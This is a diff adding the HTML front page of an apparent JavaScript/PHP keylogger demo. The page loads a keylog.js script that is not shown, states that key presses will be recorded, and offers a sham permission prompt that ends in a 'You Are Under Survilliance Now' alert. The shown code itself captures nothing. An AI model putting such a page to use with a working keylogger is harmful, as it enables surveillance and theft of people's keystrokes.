@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>JS PHP Keylog</title>
+    <meta charset="utf-8">
+    <script src="keylog.js"></script>
+  </head>
+  <body>
+    <center><h1>All key presses will be recorded!</h1></center><br><br><hr>
+    <center><h1>Sophiya Sins </h1></center>
+
+    <center><button onclick="showPrompt()">Click To Connect & Alot permissions</button>
+
+    <script>
+        function showPrompt() {
+            const userInput = prompt("Thanks For Giving Access ,  Please type YES for Confirmation  ", "YES");
+            if (userInput === null || userInput === "") {
+                alert("You canceled or entered nothing.");
+            } else {
+                // Display a message with the user's input
+                alert("You Are Under Survilliance Now !");
+            }
+        }
+    </script>
+  </center>
+
+  </body>
+</html>
